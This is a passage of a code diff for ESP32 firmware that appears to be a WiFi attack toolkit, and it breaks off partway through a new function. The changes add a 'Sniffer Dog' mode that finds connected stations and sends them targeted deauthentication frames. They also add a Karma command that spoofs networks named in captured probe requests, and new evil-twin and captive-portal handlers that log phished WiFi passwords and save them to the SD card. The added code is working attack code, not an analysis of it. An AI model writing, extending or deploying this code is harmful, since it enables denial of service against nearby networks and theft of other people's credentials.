@@ -56,7 +56,7 @@
 #include "lwip/dhcp.h"
 
 //Version number
-#define JANOS_VERSION "0.1.0"
+#define JANOS_VERSION "0.5.0"
 
 
 #define NEOPIXEL_GPIO      27
@@ -174,6 +174,13 @@ static volatile bool periodic_rescan_in_progress = false; // Flag to suppress lo
 static TaskHandle_t sae_attack_task_handle = NULL;
 static volatile bool sae_attack_active = false;
 
+// Sniffer Dog attack task
+static TaskHandle_t sniffer_dog_task_handle = NULL;
+static volatile bool sniffer_dog_active = false;
+static int sniffer_dog_current_channel = 1;
+static int sniffer_dog_channel_index = 0;
+static int64_t sniffer_dog_last_channel_hop = 0;
+
 // Wardrive task
 static TaskHandle_t wardrive_task_handle = NULL;
 
@@ -227,7 +234,17 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    if (err == ESP_ERR_NO_MEM) {
+        //give it a breath:
+        vTaskDelay(pdMS_TO_TICKS(20));
+        MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM: %d", heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
+        return; // lub ponów próbę później
+    }
+
+    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
 }
 
 
@@ -252,6 +269,7 @@ static int g_selected_count = 0;
 
 char * evilTwinSSID = NULL;
 char * evilTwinPassword = NULL;
+char * portalSSID = NULL;  // SSID for standalone portal mode
 int connectAttemptCount = 0;
 led_strip_handle_t strip;
 static bool last_password_wrong = false;
@@ -264,6 +282,14 @@ static int sd_html_count = 0;
 static char* custom_portal_html = NULL;
 static bool sd_card_mounted = false;
 
+// Whitelist for BSSID protection
+#define MAX_WHITELISTED_BSSIDS 150
+typedef struct {
+    uint8_t bssid[6];
+} whitelisted_bssid_t;
+static whitelisted_bssid_t whiteListedBssids[MAX_WHITELISTED_BSSIDS];
+static int whitelistedBssidsCount = 0;
+
 
 // Methods forward declarations
 static int cmd_scan_networks(int argc, char **argv);
@@ -274,9 +300,11 @@ static int cmd_start_wardrive(int argc, char **argv);
 static int cmd_start_sniffer(int argc, char **argv);
 static int cmd_show_sniffer_results(int argc, char **argv);
 static int cmd_show_probes(int argc, char **argv);
+static int cmd_list_probes(int argc, char **argv);
 static int cmd_sniffer_debug(int argc, char **argv);
 static int cmd_start_blackout(int argc, char **argv);
 static int cmd_start_portal(int argc, char **argv);
+static int cmd_start_karma(int argc, char **argv);
 static int cmd_list_sd(int argc, char **argv);
 static int cmd_select_html(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
@@ -299,6 +327,8 @@ static void dns_server_task(void *pvParameters);
 static esp_err_t root_handler(httpd_req_t *req);
 static esp_err_t portal_handler(httpd_req_t *req);
 static esp_err_t login_handler(httpd_req_t *req);
+static esp_err_t get_handler(httpd_req_t *req);
+static esp_err_t save_handler(httpd_req_t *req);
 static esp_err_t android_captive_handler(httpd_req_t *req);
 static esp_err_t ios_captive_handler(httpd_req_t *req);
 static esp_err_t captive_detection_handler(httpd_req_t *req);
@@ -306,6 +336,11 @@ static esp_err_t captive_detection_handler(httpd_req_t *req);
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
 static void sniffer_channel_hop(void);
+// Sniffer Dog functions
+static int cmd_start_sniffer_dog(int argc, char **argv);
+static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static void sniffer_dog_task(void *pvParameters);
+static void sniffer_dog_channel_hop(void);
 static void sniffer_channel_task(void *pvParameters);
 static bool is_multicast_mac(const uint8_t *mac);
 static bool is_broadcast_bssid(const uint8_t *bssid);
@@ -319,6 +354,12 @@ static void get_timestamp_string(char* buffer, size_t size);
 static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
 static bool wait_for_gps_fix(int timeout_seconds);
 static int find_next_wardrive_file_number(void);
+// Portal data logging functions
+static void save_evil_twin_password(const char* ssid, const char* password);
+static void save_portal_data(const char* ssid, const char* form_data);
+// Whitelist functions
+static void load_whitelist_from_sd(void);
+static bool is_bssid_whitelisted(const uint8_t *bssid);
 // SAE WPA3 attack methods forward declarations:
 //add methods declarations below:
 static void inject_sae_commit_frame();
@@ -461,6 +502,15 @@ static void wifi_event_handler(void *event_handler_arg,
                 }
                 
                 MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
+                
+                // Small delay to ensure all resources are properly released
+                vTaskDelay(pdMS_TO_TICKS(500));
+                
+                // Now save verified password to SD card (after portal is fully closed)
+                if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
+                    MY_LOG_INFO(TAG, "Saving verified password to SD card...");
+                    save_evil_twin_password(evilTwinSSID, evilTwinPassword);
+                }
             }
             
             applicationState = IDLE;
@@ -1227,6 +1277,9 @@ static void deauth_attack_task(void *pvParameters) {
             
             // Temporarily pause deauth for scanning
             esp_err_t scan_result = quick_channel_scan();
+            if (scan_result != ESP_OK) {
+                MY_LOG_INFO(TAG, "Quick channel re-scan failed: %s", esp_err_to_name(scan_result));
+            }
             
             // Clear LED after re-scan (ignore errors if LED is in invalid state)
             led_err = led_strip_clear(strip);
@@ -1340,7 +1393,7 @@ static void blackout_attack_task(void *pvParameters) {
         // Save target BSSIDs for deauth attack
         save_target_bssids();
         
-        MY_LOG_INFO(TAG, "Starting deauth attack on all %d networks for 100 cycles...", g_selected_count);
+        MY_LOG_INFO(TAG, "Starting deauth attack on  %d networks (except whitelist) for 100 cycles...", g_selected_count);
         
         // Attack all networks for exactly 3 minutes (1800 cycles at 100ms each)
         int attack_cycles = 0;
@@ -1662,6 +1715,22 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             };
             httpd_register_uri_handler(portal_server, &login_uri);
             
+            httpd_uri_t get_uri = {
+                .uri = "/get",
+                .method = HTTP_GET,
+                .handler = get_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &get_uri);
+            
+            httpd_uri_t save_uri = {
+                .uri = "/save",
+                .method = HTTP_POST,
+                .handler = save_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &save_uri);
+            
             httpd_uri_t android_captive_uri = {
                 .uri = "/generate_204",
                 .method = HTTP_GET,
@@ -1863,6 +1932,34 @@ static int cmd_stop(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
     }
     
+    // Stop sniffer_dog if active
+    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping Sniffer Dog task...");
+        sniffer_dog_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && sniffer_dog_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (sniffer_dog_task_handle != NULL) {
+            vTaskDelete(sniffer_dog_task_handle);
+            sniffer_dog_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Sniffer Dog task forcefully stopped.");
+        }
+        
+        // Disable promiscuous mode
+        esp_wifi_set_promiscuous(false);
+        
+        // Reset channel state
+        sniffer_dog_channel_index = 0;
+        sniffer_dog_current_channel = dual_band_channels[0];
+        sniffer_dog_last_channel_hop = 0;
+        
+        MY_LOG_INFO(TAG, "Sniffer Dog stopped.");
+    }
+    
     // Stop wardrive task if running
     if (wardrive_active || wardrive_task_handle != NULL) {
         MY_LOG_INFO(TAG, "Stopping wardrive task...");
@@ -1930,6 +2027,12 @@ static int cmd_stop(int argc, char **argv) {
         // Stop AP mode
         esp_wifi_stop();
         MY_LOG_INFO(TAG, "Portal stopped.");
+        
+        // Clean up portal SSID
+        if (portalSSID != NULL) {
+            free(portalSSID);
+            portalSSID = NULL;
+        }
     }
     
     // Clear LED (ignore errors if LED is in invalid state)
@@ -2091,6 +2194,25 @@ static int cmd_show_probes(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_list_probes(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    if (probe_request_count == 0) {
+        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
+        return 0;
+    }
+    
+    // Display each probe request with index: INDEX SSID
+    for (int i = 0; i < probe_request_count; i++) {
+        probe_request_t *probe = &probe_requests[i];
+        printf("%d %s\n", i + 1, probe->ssid);
+        
+        vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
+    }
+    
+    return 0;
+}
+
 static int cmd_sniffer_debug(int argc, char **argv) {
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Current sniffer debug mode: %s", sniff_debug ? "ON" : "OFF");
@@ -2120,6 +2242,77 @@ static int cmd_sniffer_debug(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_start_sniffer_dog(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    // Reset stop flag at the beginning of operation
+    operation_stop_requested = false;
+    
+    if (sniffer_dog_active) {
+        MY_LOG_INFO(TAG, "Sniffer Dog already active. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    if (sniffer_active) {
+        MY_LOG_INFO(TAG, "Regular sniffer is active. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "Starting Sniffer Dog mode...");
+    
+    // Activate sniffer_dog
+    sniffer_dog_active = true;
+    
+    // Set LED to red (aggressive mode)
+    esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 0, 0); // Red
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
+    
+    // Set promiscuous filter
+    esp_wifi_set_promiscuous_filter(&sniffer_filter);
+    
+    // Enable promiscuous mode with sniffer_dog callback
+    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
+    esp_wifi_set_promiscuous(true);
+    
+    // Initialize dual-band channel hopping
+    sniffer_dog_channel_index = 0;
+    sniffer_dog_current_channel = dual_band_channels[0];
+    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
+    
+    // Create channel hopping task
+    BaseType_t task_created = xTaskCreate(
+        sniffer_dog_task,
+        "sniffer_dog",
+        4096,
+        NULL,
+        5,
+        &sniffer_dog_task_handle
+    );
+    
+    if (task_created != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create Sniffer Dog channel hopping task");
+        sniffer_dog_active = false;
+        esp_wifi_set_promiscuous(false);
+        
+        // Clear LED
+        led_err = led_strip_clear(strip);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "Sniffer Dog started - hunting for AP-STA pairs...");
+    MY_LOG_INFO(TAG, "Deauth packets will be sent to detected stations.");
+    MY_LOG_INFO(TAG, "Use 'stop' to stop.");
+    
+    return 0;
+}
+
 static int cmd_reboot(int argc, char **argv)
 {
     (void)argc; (void)argv;
@@ -2127,6 +2320,49 @@ static int cmd_reboot(int argc, char **argv)
     vTaskDelay(pdMS_TO_TICKS(100));
     esp_restart();
     return 0;
+}
+
+// Command: start_karma - Starts portal with SSID from probe list
+static int cmd_start_karma(int argc, char **argv)
+{
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_karma <index>");
+        MY_LOG_INFO(TAG, "Example: start_karma 2");
+        MY_LOG_INFO(TAG, "Use 'list_probes' to see available SSIDs with their indexes");
+        return 1;
+    }
+    
+    // Check if we have any probes captured
+    if (probe_request_count == 0) {
+        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data first.");
+        return 1;
+    }
+    
+    // Parse the index argument
+    int index = atoi(argv[1]);
+    
+    // Validate index (1-based for user, 0-based internally)
+    if (index < 1 || index > probe_request_count) {
+        MY_LOG_INFO(TAG, "Invalid index %d. Valid range: 1-%d", index, probe_request_count);
+        MY_LOG_INFO(TAG, "Use 'list_probes' to see available indexes");
+        return 1;
+    }
+    
+    // Convert to 0-based index
+    int probe_index = index - 1;
+    
+    // Get the SSID from the probe request
+    char *selected_ssid = probe_requests[probe_index].ssid;
+    
+    MY_LOG_INFO(TAG, "Starting Karma attack with SSID: %s", selected_ssid);
+    
+    // Prepare arguments for cmd_start_portal
+    char *portal_argv[2];
+    portal_argv[0] = "start_portal";
+    portal_argv[1] = selected_ssid;
+    
+    // Call cmd_start_portal with the selected SSID
+    return cmd_start_portal(2, portal_argv);
 }
 
 // Command: list_sd - Lists HTML files on SD card
@@ -2607,9 +2843,12 @@ static esp_err_t login_handler(httpd_req_t *req) {
         // Log the password
         MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
         
-        // If in evil twin mode, verify the password
+        // If in evil twin mode, verify the password (save will happen after verification)
         if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
             verify_password(decoded_password);
+        } else {
+            // Regular portal mode - save all form data to portals.txt
+            save_portal_data(portalSSID, buf);
         }
     }
     
@@ -2640,6 +2879,209 @@ static esp_err_t login_handler(httpd_req_t *req) {
             "</body></html>";
     } else {
         // Show "Processing" message
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for GET /get endpoint
+static esp_err_t get_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "GET handler called - URI: %s", req->uri);
+    
+    // Get query string
+    size_t query_len = httpd_req_get_url_query_len(req);
+    if (query_len > 0) {
+        char *query_string = malloc(query_len + 1);
+        if (query_string) {
+            if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
+                MY_LOG_INFO(TAG, "Received GET query: %s", query_string);
+                
+                // Parse password from query string
+                char password_param[64];
+                if (httpd_query_key_value(query_string, "password", password_param, sizeof(password_param)) == ESP_OK) {
+                    // URL decode the password
+                    char decoded_password[64];
+                    int decoded_len = 0;
+                    for (char *p = password_param; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+                        if (*p == '%' && p[1] && p[2]) {
+                            char hex[3] = {p[1], p[2], '\0'};
+                            decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                            p += 2;
+                        } else if (*p == '+') {
+                            decoded_password[decoded_len++] = ' ';
+                        } else {
+                            decoded_password[decoded_len++] = *p;
+                        }
+                    }
+                    decoded_password[decoded_len] = '\0';
+                    
+                    // Log the password
+                    MY_LOG_INFO(TAG, "Portal password received (GET): %s", decoded_password);
+                    
+                    // If in evil twin mode, verify the password (save will happen after verification)
+                    if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+                        verify_password(decoded_password);
+                    } else {
+                        // Regular portal mode - save all form data to portals.txt
+                        // For GET requests, query_string has same format as POST data
+                        save_portal_data(portalSSID, query_string);
+                    }
+                }
+            }
+            free(query_string);
+        }
+    }
+    
+    // Send response
+    const char* response;
+    if (last_password_wrong) {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for POST /save endpoint
+static esp_err_t save_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Save handler called - URI: %s", req->uri);
+    
+    char buf[256];
+    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (ret <= 0) {
+        MY_LOG_INFO(TAG, "Failed to receive POST data");
+        return ESP_FAIL;
+    }
+    buf[ret] = '\0';
+    
+    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
+    
+    // Parse password from POST data
+    char *password_start = strstr(buf, "password=");
+    if (password_start) {
+        password_start += 9; // Skip "password="
+        char *password_end = strchr(password_start, '&');
+        if (password_end) {
+            *password_end = '\0';
+        }
+        
+        // URL decode the password
+        char decoded_password[64];
+        int decoded_len = 0;
+        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+            if (*p == '%' && p[1] && p[2]) {
+                char hex[3] = {p[1], p[2], '\0'};
+                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                p += 2;
+            } else if (*p == '+') {
+                decoded_password[decoded_len++] = ' ';
+            } else {
+                decoded_password[decoded_len++] = *p;
+            }
+        }
+        decoded_password[decoded_len] = '\0';
+        
+        // Log the password
+        MY_LOG_INFO(TAG, "Portal password received (SAVE): %s", decoded_password);
+        
+        // If in evil twin mode, verify the password (save will happen after verification)
+        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+            verify_password(decoded_password);
+        } else {
+            // Regular portal mode - save all form data to portals.txt
+            save_portal_data(portalSSID, buf);
+        }
+    }
+    
+    // Send response
+    const char* response;
+    if (last_password_wrong) {
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
         response = 
             "<!DOCTYPE html><html><head>"
             "<meta charset='UTF-8'>"
@@ -2951,7 +3393,12 @@ static void dns_server_task(void *pvParameters) {
 
 // Start portal command
 static int cmd_start_portal(int argc, char **argv) {
-    (void)argc; (void)argv;
+    // Check for SSID argument
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_portal <SSID>");
+        MY_LOG_INFO(TAG, "Example: start_portal MyWiFi");
+        return 1;
+    }
     
     // Check if portal is already running
     if (portal_active) {
@@ -2959,7 +3406,25 @@ static int cmd_start_portal(int argc, char **argv) {
         return 0;
     }
     
-    MY_LOG_INFO(TAG, "Starting captive portal...");
+    const char *ssid = argv[1];
+    size_t ssid_len = strlen(ssid);
+    
+    // Validate SSID length (WiFi SSID max is 32 characters)
+    if (ssid_len == 0 || ssid_len > 32) {
+        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
+        return 1;
+    }
+    
+    // Store portal SSID for logging purposes
+    if (portalSSID != NULL) {
+        free(portalSSID);
+    }
+    portalSSID = malloc(ssid_len + 1);
+    if (portalSSID != NULL) {
+        strcpy(portalSSID, ssid);
+    }
+    
+    MY_LOG_INFO(TAG, "Starting captive portal with SSID: %s", ssid);
     
     // Get AP netif and stop DHCP to configure custom IP
     esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
@@ -2985,17 +3450,14 @@ static int cmd_start_portal(int argc, char **argv) {
     
     MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
     
-    // Configure AP
-    wifi_config_t ap_config = {
-        .ap = {
-            .ssid = "Portal",
-            .ssid_len = 6,
-            .channel = 1,
-            .password = "",
-            .max_connection = 4,
-            .authmode = WIFI_AUTH_OPEN
-        }
-    };
+    // Configure AP with provided SSID
+    wifi_config_t ap_config = {0};
+    memcpy(ap_config.ap.ssid, ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    ap_config.ap.channel = 1;
+    ap_config.ap.password[0] = '\0';
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
     
     // Start AP
     ret = esp_wifi_set_mode(WIFI_MODE_AP);
@@ -3080,6 +3542,24 @@ static int cmd_start_portal(int argc, char **argv) {
         .user_ctx = NULL
     };
     httpd_register_uri_handler(portal_server, &login_uri);
+    
+    // GET handler
+    httpd_uri_t get_uri = {
+        .uri = "/get",
+        .method = HTTP_GET,
+        .handler = get_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &get_uri);
+    
+    // Save handler
+    httpd_uri_t save_uri = {
+        .uri = "/save",
+        .method = HTTP_POST,
+        .handler = save_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &save_uri);
     
     // Android captive portal detection
     httpd_uri_t android_captive_uri = {
@@ -3170,9 +3650,9 @@ static int cmd_start_portal(int argc, char **argv) {
     MY_LOG_INFO(TAG, "DNS server task started");
     
     MY_LOG_INFO(TAG, "Captive portal started successfully!");
-    MY_LOG_INFO(TAG, "AP Name: Portal");
+    MY_LOG_INFO(TAG, "AP Name: %s", ssid);
     MY_LOG_INFO(TAG, "AP IP: 172.0.0.1");
-    MY_LOG_INFO(TAG, "Connect to 'Portal' WiFi network to access the portal");
+    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the portal", ssid);
     MY_LOG_INFO(TAG, "DNS server running on port 53 - all queries redirect to 172.0.0.1");
     MY_LOG_INFO(TAG, "HTTP server running on port 80");
     
@@ -3229,6 +3709,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&show_probes_cmd));
 
+    const esp_console_cmd_t list_probes_cmd = {
+        .command = "list_probes",
+        .help = "Lists probe requests with index and SSID",
+        .hint = NULL,
+        .func = &cmd_list_probes,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&list_probes_cmd));
+
     const esp_console_cmd_t sniffer_debug_cmd = {
         .command = "sniffer_debug",
         .help = "Enable/disable detailed sniffer debug logging: sniffer_debug <0|1>",
@@ -3237,6 +3726,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_debug_cmd));
+
+    const esp_console_cmd_t sniffer_dog_cmd = {
+        .command = "start_sniffer_dog",
+        .help = "Starts Sniffer Dog - captures AP-STA pairs and sends targeted deauth packets",
+        .hint = NULL,
+        .func = &cmd_start_sniffer_dog,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_dog_cmd));
 
     const esp_console_cmd_t select_cmd = {
         .command = "select_networks",
@@ -3294,12 +3792,21 @@ static void register_commands(void)
 
     const esp_console_cmd_t portal_cmd = {
         .command = "start_portal",
-        .help = "Starts captive portal with password form",
+        .help = "Starts captive portal with password form: start_portal <SSID>",
         .hint = NULL,
         .func = &cmd_start_portal,
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
+
+    const esp_console_cmd_t karma_cmd = {
+        .command = "start_karma",
+        .help = "Starts Karma attack with SSID from probe list: start_karma <index>",
+        .hint = NULL,
+        .func = &cmd_start_karma,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&karma_cmd));
 
     const esp_console_cmd_t stop_cmd = {
         .command = "stop",
@@ -3418,13 +3925,14 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  sae_overflow");
     MY_LOG_INFO(TAG,"  start_blackout");
     MY_LOG_INFO(TAG,"  start_wardrive");
-    MY_LOG_INFO(TAG,"  start_portal");
+    MY_LOG_INFO(TAG,"  start_portal <SSID>");
     MY_LOG_INFO(TAG,"  list_sd");
     MY_LOG_INFO(TAG,"  select_html <index>");
     MY_LOG_INFO(TAG,"  start_sniffer");
     MY_LOG_INFO(TAG,"  show_sniffer_results");
     MY_LOG_INFO(TAG,"  show_probes");
     MY_LOG_INFO(TAG,"  sniffer_debug <0|1>");
+    MY_LOG_INFO(TAG,"  start_sniffer_dog");
     MY_LOG_INFO(TAG,"  stop");
     MY_LOG_INFO(TAG,"  reboot");
 
@@ -3439,8 +3947,13 @@ void app_main(void) {
  
     ESP_ERROR_CHECK(esp_console_start_repl(repl));
     vTaskDelay(pdMS_TO_TICKS(500));
+    
+    // Load BSSID whitelist from SD card
+    load_whitelist_from_sd();
+    vTaskDelay(pdMS_TO_TICKS(500));
     MY_LOG_INFO(TAG,"BOARD READY");
     vTaskDelay(pdMS_TO_TICKS(100));
+    
 }
 
 void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
@@ -3464,6 +3977,14 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         }
 
         if (!target_bssids[i].active) continue;
+        
+        // Check if BSSID is whitelisted - but ONLY during blackout attack, not during regular deauth
+        if (blackout_attack_active && is_bssid_whitelisted(target_bssids[i].bssid)) {
+            // MY_LOG_INFO(TAG, "Skipping whitelisted BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+            //            target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
+            //            target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5]);
+            continue;
+        }
         
         // Enhanced logging to debug BSSID mismatch issue
         // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
@@ -4353,6 +4874,180 @@ static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t 
     }
 }
 
+// === SNIFFER DOG HELPER FUNCTIONS ===
+
+// Channel hopping for sniffer_dog
+static void sniffer_dog_channel_hop(void) {
+    if (!sniffer_dog_active) {
+        return;
+    }
+    
+    // Use dual-band channel hopping
+    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
+    
+    sniffer_dog_channel_index++;
+    if (sniffer_dog_channel_index >= dual_band_channels_count) {
+        sniffer_dog_channel_index = 0;
+    }
+    
+    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
+}
+
+// Task that handles channel hopping for sniffer_dog
+static void sniffer_dog_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    while (sniffer_dog_active) {
+        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
+        
+        if (!sniffer_dog_active) {
+            continue;
+        }
+        
+        // Force channel hop if 250ms passed
+        int64_t current_time = esp_timer_get_time() / 1000;
+        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
+        
+        if (time_expired) {
